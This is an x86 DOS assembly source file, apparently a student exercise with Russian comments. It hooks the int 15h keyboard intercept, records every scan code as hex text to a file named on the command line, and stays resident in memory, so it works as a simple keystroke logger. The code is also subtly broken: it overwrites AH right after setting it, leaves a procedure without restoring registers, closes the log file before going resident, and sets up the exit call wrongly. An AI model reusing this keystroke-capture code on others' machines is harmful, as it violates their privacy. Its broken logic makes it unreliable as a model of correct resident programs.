.model tiny   
.code
org 100h  

start: 
    jmp main   
       
oldOffset dw ?
oldSegment dw ?

openFileFlag db 0    

fileName db 50 dup('$')  

id dw ?      

keyBuffer db 2 dup ('$')       

screenModeMessage db "SCREEN MODE",'$'
openMessage db "File was opened",'$'              
closeMessage db 10,13,"File was closed",'$'                
errorMessage db "Fail during working with files..",'$'  
emptyCmdMessage db "cmd is empty...Nothing to handle",'$'   
tooManyMessage db "Too many args were entered",'$'  
NotFindFileMsg db "File not found!",'$'  

SPACE db ' '

newHandler proc far     
   
    pushf      
    pusha       
    push ds  
    push cs
    pop ds		;ds = сегментный адрес области данных BIOS      
    push es                 
     
	;функция 4Fh(int 15h)
    mov ah, 4Fh 
	
	;приводим код в нормальный вид
    xor ah,ah
    mov bl,10h
    div bl
    add al,30h
    add ah,30h  
    cmp al, 38h
    jl toAh  
    jmp handlerEnd
    toAh:
    cmp ah,3Ah   
    jl toKeyBuffer 		;если все нормально
    add ah,7h 			;иначе приводим до конца и затем
    toKeyBuffer: 		;записываем в буфер
    mov keyBuffer[0],al
    mov keyBuffer[1],ah  
	
	cmp openFileFlag,1
	je writeInFile
    call openFile
	
writeInFile:
	;Используем функцию записи кода с клавиатуры в файл
	mov ah,40h	
	mov bx,id
	mov cx,2
	lea dx, keyBuffer
	int 21h
	
	mov ah,40h
	mov bx,id
	mov cx,1
	lea dx, SPACE
	int 21h
    jmp handlerEnd 
	
handlerEnd:    
	pop es         
    pop ds      
    popa 
    popf
    
    jmp dword ptr cs:[oldOffset]   ;возвращаем работу старому обработчику прерываний 
	jmp int_ret
	
int_ret:
	iret 
	
newHandler endp  

main: 
	call getFileName 
   
continueMain: 
    cli      			;блокировать внешнии прерывания(clear interrupt flag)
	
	;Обработчик аппаратного прерывания до обработки принятого скан-кода
	;вызывает прерывание BIOS INT15h с АН=4Fh, а в AL находится принятый скан-код
    mov ax, 3515h		;получить вектор прерывания для int 15h(возвращает текущее значение прерывания)
    int 21h
	;сохраняем прерывание
    mov oldOffset, bx	;сохраним смещение
    mov oldSegment, es	;сохраним значение сегмента
	
    mov ax, 2515h		;установим вектор прерывания для int 15h, который указывает на резедентную процедуру
    mov dx, offset newHandler
    int 21h
    sti					;возобновить реакцию на аппаратные прерывания(set interrupt flag)
checkESC:
    mov ah, 1
    int 21h
    cmp al, 27
    jne checkESC
	call closeFile
	
	;Завершить программу и оставить указанную часть резедентной
	;в регистре DX должно быть записано смещение последнего байта программы
	;этот способ остаться резидентной больше всего подходит для программ в формате COM,
	;т.к. вы не сможете оставить резидентной программу длиннее 64 килобайт.
    mov dx, offset main 
    int 27h
	;call exit
    
print macro string  
    lea dx, string
    mov ah, 09h
    int 21h  
    
    mov ah, 02h
    mov dl, 0Ah             
    int 21h                 
             
    mov ah, 02h             									
    mov dl, 0Dh  
    int 21h             
endm   
     
openFile proc 
	push dx
    lea dx, fileName 
    mov ax, 3D02h	;Загружаем в регистр ah число 3Dh (функция открытия
					;файла с записью), а в al число 02h (пишем в конец).  
    int 21h 
	mov id,ax		;При открытии файлу будет присвоен номер, его и
					;сохраняем для дальнейших действий	
    jc errorOpening
    jmp isOpened
	
errorOpening:
    print NotFindFileMsg
    jmp exit
	
isOpened:
    mov openFileFlag,1    
    print openMessage 
	pop dx
	ret
openFile endp

closeFile proc
    pusha
    mov bx, id 
    xor ax, ax       
    mov ah, 3Eh    
    int 21h          
    print closeMessage
	mov openFileFlag,0
    popa
    ret
closeFile endp

getFileName proc
	pusha
	cld
    xor cx, cx
    mov cl, ds:[80h]  ;this adress contains size of cmd 
    cmp cl, 0 
    je emptyCmd
    mov di, 82h       ;start of cmd
    lea si, fileName 
    
getSymbols:
    mov al, es:[di]    
    cmp al, 0Dh       ;compare with end  
    je continueMain   
    cmp al, ' '
    je tooManyArgs
    mov [si], al       
    inc di            
    inc si            
	jmp getSymbols 

emptyCmd:
    print emptyCmdMessage 
    jmp exit 
	
tooManyArgs:
    print tooManyMessage 
    jmp exit 
	ret
getFileName endp 

exit: 
	mov ax, 4Ch
	int 21h
end start